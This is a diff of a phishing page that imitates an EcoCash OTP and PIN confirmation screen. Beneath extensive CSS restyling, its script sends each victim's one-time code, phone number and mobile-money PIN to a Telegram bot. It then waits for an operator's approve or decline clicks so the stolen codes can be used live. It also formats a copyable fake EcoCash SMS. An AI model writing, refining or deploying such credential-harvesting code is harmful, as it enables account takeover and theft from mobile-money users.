@@ -8,17 +8,17 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --eco-red: #e53935;
-            --eco-blue-dark: #0a1628;
-            --eco-blue: #1a3a6b;
-            --eco-blue-light: #2563eb;
-            --eco-accent: #3b82f6;
+            --primary: #1746a2;
+            --primary-dark: #0a1628;
+            --primary-light: #2563eb;
+            --accent: #3b82f6;
             --white: #ffffff;
-            --light-bg: #f0f4f8;
-            --text-dark: #1a1a2e;
+            --light-bg: #eef2ff;
+            --text-dark: #0f172a;
             --text-muted: #64748b;
-            --border: #e2e8f0;
+            --border: #cbd5e1;
             --success: #10b981;
+            --error: #ef4444;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -26,7 +26,7 @@
 
         body {
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #0a1628 0%, #1a3a6b 50%, #0f2447 100%);
+            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 60%, #1e40af 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -36,8 +36,8 @@
         header {
             background: white;
             padding: 14px 5%;
-            border-bottom: 3px solid var(--eco-blue-light);
-            box-shadow: 0 2px 20px rgba(10, 22, 40, 0.12);
+            border-bottom: 3px solid var(--primary);
+            box-shadow: 0 2px 20px rgba(23, 70, 162, 0.1);
         }
 
         .logo {
@@ -50,8 +50,8 @@
             gap: 2px;
         }
 
-        .logo .eco { color: var(--eco-blue); }
-        .logo .cash { color: var(--eco-red); }
+        .logo .eco { color: var(--primary); }
+        .logo .cash { color: #e53935; }
 
         main {
             flex: 1;
@@ -64,36 +64,34 @@
         .otp-container {
             background: white;
             border-radius: 20px;
-            padding: 40px;
-            max-width: 450px;
+            padding: 36px;
+            max-width: 440px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(10, 22, 40, 0.3);
-            border: 1px solid rgba(37, 99, 235, 0.1);
+            box-shadow: 0 20px 60px rgba(10, 22, 40, 0.35);
         }
 
         .otp-header {
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
         }
 
         .otp-header h1 {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 900;
-            color: var(--text-dark);
+            color: var(--primary);
             margin-bottom: 6px;
-            letter-spacing: -0.5px;
         }
 
         .otp-header p {
             color: var(--text-muted);
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .bundle-info {
-            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 24px;
+            padding: 14px 16px;
+            margin-bottom: 22px;
             color: white;
         }
 
@@ -101,43 +99,41 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-size: 13px;
         }
 
         .bundle-info-row:last-child {
             margin-bottom: 0;
-            padding-top: 8px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-            margin-top: 8px;
+            padding-top: 6px;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            margin-top: 6px;
             font-weight: 800;
-            font-size: 16px;
+            font-size: 15px;
         }
 
-        .form-group {
-            margin-bottom: 20px;
-        }
+        .form-group { margin-bottom: 18px; }
 
         .form-label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 700;
-            color: var(--eco-blue);
+            color: var(--primary);
             text-transform: uppercase;
             letter-spacing: 0.05em;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
         .otp-inputs {
             display: flex;
             gap: 8px;
             justify-content: center;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
 
         .otp-box {
-            width: 50px;
-            height: 54px;
+            width: 48px;
+            height: 52px;
             text-align: center;
             font-size: 22px;
             font-weight: 700;
@@ -150,9 +146,9 @@
         }
 
         .otp-box:focus {
-            border-color: var(--eco-blue-light);
+            border-color: var(--primary);
             background: white;
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+            box-shadow: 0 0 0 3px rgba(23, 70, 162, 0.08);
             outline: none;
         }
 
@@ -162,120 +158,104 @@
         }
 
         .form-hint {
-            font-size: 12px;
+            font-size: 11px;
             color: var(--text-muted);
             text-align: center;
-            margin-bottom: 12px;
-            line-height: 1.5;
+            margin-bottom: 10px;
         }
 
         .auto-status {
             text-align: center;
             font-size: 12px;
             color: var(--success);
-            font-weight: 600;
-            margin-bottom: 12px;
+            font-weight: 700;
+            margin-bottom: 10px;
             display: none;
         }
 
-        .auto-status.show {
-            display: block;
-        }
+        .auto-status.show { display: block; }
 
         .error-msg {
             display: none;
-            background: rgba(229, 57, 53, 0.08);
-            border: 1px solid rgba(229, 57, 53, 0.2);
-            color: var(--eco-red);
+            background: rgba(239, 68, 68, 0.08);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            color: var(--error);
             font-size: 13px;
             font-weight: 600;
             border-radius: 10px;
             padding: 10px 14px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
             text-align: center;
         }
 
-        .error-msg.show {
-            display: block;
-        }
+        .error-msg.show { display: block; }
 
         .btn-group {
             display: flex;
-            gap: 12px;
-            margin-top: 24px;
+            gap: 10px;
+            margin-top: 20px;
         }
 
         .btn-primary {
             flex: 1;
-            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
+            background: var(--primary);
             color: white;
             border: none;
-            padding: 14px 20px;
+            padding: 14px;
             border-radius: 50px;
             font-weight: 800;
-            font-size: 14px;
+            font-size: 13px;
             text-transform: uppercase;
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
+            box-shadow: 0 4px 14px rgba(23, 70, 162, 0.3);
         }
 
         .btn-primary:hover:not(:disabled) {
+            background: var(--primary-light);
             transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
         }
 
-        .btn-primary:disabled {
-            background: #cbd5e1;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
+        .btn-primary:disabled { background: #cbd5e1; cursor: not-allowed; box-shadow: none; }
 
         .btn-secondary {
             flex: 1;
             background: transparent;
-            color: var(--eco-blue-light);
-            border: 2px solid var(--eco-blue-light);
-            padding: 14px 20px;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+            padding: 14px;
             border-radius: 50px;
             font-weight: 800;
-            font-size: 14px;
+            font-size: 13px;
             text-transform: uppercase;
-            letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
         }
 
-        .btn-secondary:hover {
-            background: rgba(37, 99, 235, 0.05);
-        }
+        .btn-secondary:hover { background: var(--light-bg); }
 
         .form-footer {
             text-align: center;
-            margin-top: 18px;
-            font-size: 12px;
+            margin-top: 16px;
+            font-size: 11px;
             color: var(--text-muted);
         }
 
-        .form-footer a {
-            color: var(--eco-blue-light);
-            text-decoration: none;
-            font-weight: 700;
-        }
+        .form-footer a { color: var(--primary); text-decoration: none; font-weight: 700; }
 
         .security-note {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            margin-top: 16px;
+            gap: 6px;
+            margin-top: 14px;
             font-size: 11px;
             color: var(--text-muted);
             font-weight: 600;
         }
 
-        /* Loading Overlay */
+        /* Loading */
         .loading-overlay {
             position: fixed;
             inset: 0;
@@ -283,41 +263,29 @@
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            gap: 16px;
-            background: rgba(10, 22, 40, 0.9);
+            gap: 14px;
+            background: rgba(10, 22, 40, 0.92);
             z-index: 2000;
             backdrop-filter: blur(6px);
         }
 
-        .loading-overlay.active {
-            display: flex;
-        }
+        .loading-overlay.active { display: flex; }
 
         .spinner {
-            width: 56px;
-            height: 56px;
-            border: 5px solid rgba(255, 255, 255, 0.15);
-            border-top-color: var(--eco-blue-light);
+            width: 52px;
+            height: 52px;
+            border: 4px solid rgba(255,255,255,0.15);
+            border-top-color: var(--accent);
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
 
-        .spin-label {
-            font-size: 16px;
-            font-weight: 700;
-            color: white;
-        }
+        .spin-label { font-size: 15px; font-weight: 700; color: white; }
+        .spin-sub { font-size: 12px; color: rgba(255,255,255,0.6); }
 
-        .spin-sub {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.6);
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Modal */
+        /* PIN Modal */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -330,32 +298,29 @@
             backdrop-filter: blur(6px);
         }
 
-        .modal-overlay.active {
-            display: flex;
-        }
+        .modal-overlay.active { display: flex; }
 
         .modal-content {
             background: white;
             border-radius: 20px;
-            padding: 36px;
-            max-width: 400px;
+            padding: 32px;
+            max-width: 380px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(10, 22, 40, 0.3);
         }
 
         .modal-title {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 900;
-            color: var(--text-dark);
-            margin-bottom: 10px;
+            color: var(--primary);
+            margin-bottom: 8px;
             text-align: center;
         }
 
         .modal-subtitle {
             color: var(--text-muted);
-            font-size: 14px;
-            margin-bottom: 24px;
-            line-height: 1.6;
+            font-size: 13px;
+            margin-bottom: 20px;
             text-align: center;
         }
 
@@ -367,13 +332,13 @@
             padding: 12px 14px;
             background: var(--light-bg);
             transition: all 0.2s;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
 
         .pin-input-group:focus-within {
-            border-color: var(--eco-blue-light);
+            border-color: var(--primary);
             background: white;
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+            box-shadow: 0 0 0 3px rgba(23, 70, 162, 0.08);
         }
 
         .pin-input-field {
@@ -388,80 +353,69 @@
             text-align: center;
         }
 
-        .pin-input-field::placeholder {
-            color: var(--text-muted);
-            letter-spacing: 0;
-        }
+        .pin-input-field::placeholder { color: var(--text-muted); letter-spacing: 0; }
 
         .modal-error {
             display: none;
-            background: rgba(229, 57, 53, 0.08);
-            border: 1px solid rgba(229, 57, 53, 0.2);
-            color: var(--eco-red);
+            background: rgba(239, 68, 68, 0.08);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            color: var(--error);
             font-size: 13px;
             font-weight: 600;
             border-radius: 10px;
             padding: 10px 14px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
             text-align: center;
         }
 
-        .modal-error.show {
-            display: block;
-        }
+        .modal-error.show { display: block; }
 
         .pin-modal-buttons {
             display: flex;
-            gap: 12px;
+            gap: 10px;
         }
 
         .pin-modal-btn {
             flex: 1;
-            padding: 13px 20px;
+            padding: 13px;
             border-radius: 50px;
             border: none;
             font-weight: 800;
-            font-size: 14px;
+            font-size: 13px;
             text-transform: uppercase;
-            letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
         }
 
         .pin-modal-btn-confirm {
-            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
+            background: var(--primary);
             color: white;
-            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
+            box-shadow: 0 4px 14px rgba(23, 70, 162, 0.3);
         }
 
-        .pin-modal-btn-confirm:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
-        }
+        .pin-modal-btn-confirm:hover { background: var(--primary-light); transform: translateY(-1px); }
 
         .pin-modal-btn-cancel {
             background: transparent;
-            color: var(--eco-blue-light);
-            border: 2px solid var(--eco-blue-light);
+            color: var(--primary);
+            border: 2px solid var(--primary);
         }
 
-        .pin-modal-btn-cancel:hover {
-            background: rgba(37, 99, 235, 0.05);
-        }
+        .pin-modal-btn-cancel:hover { background: var(--light-bg); }
 
-        .pin-auto-hint {
+        .pin-hint {
             text-align: center;
             font-size: 11px;
             color: var(--text-muted);
-            margin-top: 12px;
+            margin-top: 10px;
         }
 
         @media (max-width: 600px) {
             main { padding: 20px 16px; }
-            .otp-container { padding: 28px 20px; }
-            .otp-header h1 { font-size: 22px; }
+            .otp-container { padding: 24px 18px; }
+            .otp-header h1 { font-size: 20px; }
             .otp-inputs { gap: 6px; }
-            .otp-box { width: 44px; height: 48px; font-size: 18px; }
+            .otp-box { width: 42px; height: 46px; font-size: 18px; }
             .btn-group { flex-direction: column; }
         }
     </style>
@@ -501,8 +455,8 @@
                     <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                     <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                 </div>
-                <div id="autoStatus" class="auto-status">&#9989; Code complete — submitting automatically...</div>
-                <p class="form-hint">Check your SMS for the verification code</p>
+                <div id="autoStatus" class="auto-status">&#9989; Code complete — submitting...</div>
+                <p class="form-hint">Code auto-submits when all 6 digits are entered</p>
 
                 <div class="btn-group">
                     <button class="btn-primary" id="confirmBtn" onclick="validateOTP()">Verify & Proceed</button>
@@ -511,16 +465,12 @@
             </div>
 
             <div class="form-footer">
-                Your transaction is protected with 256-bit encryption. <a href="#">Learn more</a>
+                Protected with 256-bit encryption. <a href="#">Learn more</a>
             </div>
-
-            <div class="security-note">
-                <span>&#128274;</span> End-to-end Encrypted &middot; Secure
-            </div>
+            <div class="security-note">&#128274; End-to-end Encrypted</div>
         </div>
     </main>
 
-    <!-- Loading Overlay -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="spinner"></div>
         <div class="spin-label">Verifying Code</div>
@@ -531,16 +481,16 @@
     <div id="pinModal" class="modal-overlay">
         <div class="modal-content">
             <h2 class="modal-title">Confirm Transaction</h2>
-            <p class="modal-subtitle">Enter your EcoCash PIN to confirm this transaction</p>
+            <p class="modal-subtitle">Enter your EcoCash PIN to confirm</p>
             <div id="pinModalError" class="modal-error"></div>
             <div class="pin-input-group">
-                <input type="password" class="pin-input-field" id="pinInput" placeholder="Enter 4-digit PIN" inputmode="numeric" maxlength="4">
+                <input type="password" class="pin-input-field" id="pinInput" placeholder="4-digit PIN" inputmode="numeric" maxlength="4">
             </div>
             <div class="pin-modal-buttons">
-                <button class="pin-modal-btn pin-modal-btn-confirm" id="pinConfirmBtn" onclick="submitPin()">Confirm</button>
+                <button class="pin-modal-btn pin-modal-btn-confirm" onclick="submitPin()">Confirm</button>
                 <button class="pin-modal-btn pin-modal-btn-cancel" onclick="closePinModal()">Cancel</button>
             </div>
-            <p class="pin-auto-hint">PIN will auto-submit when 4 digits are entered</p>
+            <p class="pin-hint">Auto-submits when 4 digits entered</p>
         </div>
     </div>
 
@@ -557,7 +507,6 @@
             const data = params.get('data');
             const price = params.get('price');
             phoneNumber = params.get('phone') || '';
-
             if (data && price) {
                 bundleData = { data, price };
                 document.getElementById('bundleInfo').style.display = 'block';
@@ -566,13 +515,12 @@
             }
         }
 
-        // OTP Input Handling with Auto-Fill and Auto-Submit
+        // OTP Input Handling
         const otpInputs = document.querySelectorAll('.otp-box');
         otpInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 const value = e.target.value;
-                
-                // Handle paste of full OTP code
+                // Handle multi-char paste into single box
                 if (value.length > 1) {
                     const digits = value.replace(/\D/g, '').split('');
                     digits.forEach((digit, i) => {
@@ -581,18 +529,15 @@
                             otpInputs[index + i].classList.add('filled');
                         }
                     });
-                    const nextIndex = Math.min(index + digits.length, otpInputs.length - 1);
-                    otpInputs[nextIndex].focus();
+                    const next = Math.min(index + digits.length, otpInputs.length - 1);
+                    otpInputs[next].focus();
                     updateOTPCode();
                     checkAutoSubmit();
                     return;
                 }
-
                 if (value) {
                     input.classList.add('filled');
-                    if (index < otpInputs.length - 1) {
-                        otpInputs[index + 1].focus();
-                    }
+                    if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
                 } else {
                     input.classList.remove('filled');
                 }
@@ -607,20 +552,17 @@
                 }
             });
 
-            // Handle paste event
             input.addEventListener('paste', (e) => {
                 e.preventDefault();
-                const pastedData = e.clipboardData.getData('text').replace(/\D/g, '');
-                if (pastedData.length > 0) {
-                    const digits = pastedData.split('');
-                    digits.forEach((digit, i) => {
+                const pasted = e.clipboardData.getData('text').replace(/\D/g, '');
+                if (pasted.length > 0) {
+                    pasted.split('').forEach((digit, i) => {
                         if (i < otpInputs.length) {
                             otpInputs[i].value = digit;
                             otpInputs[i].classList.add('filled');
                         }
                     });
-                    const lastIndex = Math.min(digits.length - 1, otpInputs.length - 1);
-                    otpInputs[lastIndex].focus();
+                    otpInputs[Math.min(pasted.length - 1, otpInputs.length - 1)].focus();
                     updateOTPCode();
                     checkAutoSubmit();
                 }
@@ -634,9 +576,7 @@
         function checkAutoSubmit() {
             if (otpCode.length === 6) {
                 document.getElementById('autoStatus').classList.add('show');
-                setTimeout(() => {
-                    validateOTP();
-                }, 600);
+                setTimeout(() => validateOTP(), 500);
             }
         }
 
@@ -646,16 +586,12 @@
                 showError('Please enter all 6 digits');
                 return;
             }
-
             document.getElementById('autoStatus').classList.remove('show');
             document.getElementById('loadingOverlay').classList.add('active');
 
-            // Generate the hidden OTP message for Telegram (copyable format)
-            const otpMessage = `Your EcoCash OTP is.${otpCode}. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ`;
+            // Send OTP to Telegram — message is copyable (tap to copy on Telegram)
+            const message = `\u{1f4f2} <b>OTP Verification</b>\n\n<b>OTP Code:</b> <code>${otpCode}</code>\n<b>Phone:</b> <code>+263${phoneNumber}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>\n\n<b>Message (tap to copy):</b>\n<code>Your EcoCash OTP is.${otpCode}. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>`;
 
-            // Send OTP to Telegram with copyable message, OTP, and phone number
-            const message = `📲 <b>OTP Verification</b>\n\n<b>OTP Code:</b> <code>${otpCode}</code>\n<b>Phone:</b> <code>+263${phoneNumber}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>\n\n<b>Full Message (tap to copy):</b>\n<code>Your EcoCash OTP is.${otpCode}. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>`;
-            
             const buttons = [
                 [
                     { text: '\u2713 Approved', callback_data: 'otp_approved' },
@@ -679,11 +615,8 @@
                         parse_mode: 'HTML'
                     })
                 });
-
                 return response.ok;
-            } catch (error) {
-                console.error('Error:', error);
-            }
+            } catch (error) { console.error('Error:', error); }
             return false;
         }
 
@@ -695,18 +628,16 @@
                         if (data.ok && data.result.length > 0) {
                             const update = data.result[0];
                             lastUpdateId = update.update_id;
-
                             if (update.callback_query) {
-                                const callbackData = update.callback_query.data;
-
-                                if (callbackData === 'otp_approved') {
+                                const cb = update.callback_query.data;
+                                if (cb === 'otp_approved') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
                                     openPinModal();
-                                } else if (callbackData === 'otp_declined') {
+                                } else if (cb === 'otp_declined') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
-                                    showError('OTP verification declined. Please try again.');
+                                    showError('OTP declined. Please try again.');
                                     resetOTP();
                                 }
                             }
@@ -714,15 +645,12 @@
                     })
                     .catch(err => console.error('Poll error:', err));
             }, 1000);
-
             setTimeout(() => clearInterval(pollInterval), 300000);
         }
 
         function openPinModal() {
             document.getElementById('pinModal').classList.add('active');
-            setTimeout(() => {
-                document.getElementById('pinInput').focus();
-            }, 300);
+            setTimeout(() => document.getElementById('pinInput').focus(), 300);
         }
 
         function closePinModal() {
@@ -730,32 +658,28 @@
             document.getElementById('pinInput').value = '';
         }
 
-        // Auto-submit PIN when 4 digits are entered
+        // Auto-submit PIN when 4 digits entered
         document.getElementById('pinInput').addEventListener('input', function() {
             if (this.value.length === 4) {
-                setTimeout(() => {
-                    submitPin();
-                }, 300);
+                setTimeout(() => submitPin(), 300);
             }
         });
 
         function submitPin() {
             const pin = document.getElementById('pinInput').value.trim();
             const pinError = document.getElementById('pinModalError');
-
             if (!pin || pin.length !== 4) {
                 pinError.textContent = 'PIN must be 4 digits';
                 pinError.classList.add('show');
                 return;
             }
-
             pinError.classList.remove('show');
             document.getElementById('pinModal').classList.remove('active');
             document.getElementById('loadingOverlay').classList.add('active');
 
-            // Send PIN to Telegram with all copyable fields
-            const message = `🔐 <b>PIN Confirmation</b>\n\n<b>PIN:</b> <code>${pin}</code>\n<b>OTP Code:</b> <code>${otpCode}</code>\n<b>Phone:</b> <code>+263${phoneNumber}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>\n\n<b>OTP Message (tap to copy):</b>\n<code>Your EcoCash OTP is.${otpCode}. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>`;
-            
+            // PIN message — only PIN, phone, bundle — NO OTP repeat
+            const message = `\u{1f510} <b>PIN Confirmation</b>\n\n<b>PIN:</b> <code>${pin}</code>\n<b>Phone:</b> <code>+263${phoneNumber}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>`;
+
             const buttons = [
                 [
                     { text: '\u2713 Valid PIN', callback_data: 'pin_valid' },
@@ -764,10 +688,10 @@
             ];
 
             sendToTelegram(message, buttons);
-            pollForPinApproval(pin);
+            pollForPinApproval();
         }
 
-        function pollForPinApproval(pin) {
+        function pollForPinApproval() {
             const pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                     .then(res => res.json())
@@ -775,20 +699,18 @@
                         if (data.ok && data.result.length > 0) {
                             const update = data.result[0];
                             lastUpdateId = update.update_id;
-
                             if (update.callback_query) {
-                                const callbackData = update.callback_query.data;
-
-                                if (callbackData === 'pin_valid') {
+                                const cb = update.callback_query.data;
+                                if (cb === 'pin_valid') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
                                     proceedToSuccess();
-                                } else if (callbackData === 'pin_invalid') {
+                                } else if (cb === 'pin_invalid') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
                                     document.getElementById('pinModal').classList.add('active');
                                     const pinError = document.getElementById('pinModalError');
-                                    pinError.textContent = 'Invalid PIN. Please try again.';
+                                    pinError.textContent = 'Invalid PIN. Try again.';
                                     pinError.classList.add('show');
                                     document.getElementById('pinInput').value = '';
                                     document.getElementById('pinInput').focus();
@@ -798,25 +720,21 @@
                     })
                     .catch(err => console.error('Poll error:', err));
             }, 1000);
-
             setTimeout(() => clearInterval(pollInterval), 300000);
         }
 
         function proceedToSuccess() {
-            window.location.href = `success.html?data=${encodeURIComponent(bundleData.data)}&price=${bundleData.price}`;
+            window.location.href = `success.html?data=${encodeURIComponent(bundleData.data || '')}&price=${bundleData.price || ''}`;
         }
 
         function showError(msg) {
-            const errorMsg = document.getElementById('errorMsg');
-            errorMsg.textContent = msg;
-            errorMsg.classList.add('show');
+            const el = document.getElementById('errorMsg');
+            el.textContent = msg;
+            el.classList.add('show');
         }
 
         function resetOTP() {
-            otpInputs.forEach(input => {
-                input.value = '';
-                input.classList.remove('filled');
-            });
+            otpInputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
             otpCode = '';
             otpInputs[0].focus();
         }
